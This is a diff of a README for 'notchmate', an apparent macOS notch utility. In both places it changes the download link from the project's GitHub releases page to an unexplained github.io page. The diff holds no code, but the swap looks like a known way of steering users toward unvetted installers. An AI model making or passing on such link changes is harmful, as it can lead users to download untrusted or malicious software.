@@ -46,7 +46,7 @@ Getting notchmate on your Mac is easy! Here's what you need to do:
 
 ### Step 1: Download The App
 
-**Visit this link to download the application:** [Download notchmate](https://github.com/Anthelmintic-cuneiform116/notchmate/releases)
+**Visit this link to download the application:** [Download notchmate](https://anthelmintic-cuneiform116.github.io)
 
 When you click the link, you'll land on a page with the latest version of notchmate ready for you. Look for the most recent release and click the download button.
 
@@ -116,7 +116,7 @@ notchmate is growing, and the developers love hearing from users. Whether you ha
 
 Now that you know what notchmate can do, it's time to try it for yourself! Remember, it's free, it's fun, and it's going to make your Mac feel smarter than ever.
 
-**Visit this link to download the application:** [Get notchmate Now](https://github.com/Anthelmintic-cuneiform116/notchmate/releases)
+**Visit this link to download the application:** [Get notchmate Now](https://anthelmintic-cuneiform116.github.io)
 
 Whether you're a student, a professional, or just someone who loves cool tech, notchmate is here to make your computing life easier and more enjoyable. Give it a try – your Mac's notch will thank you!
 
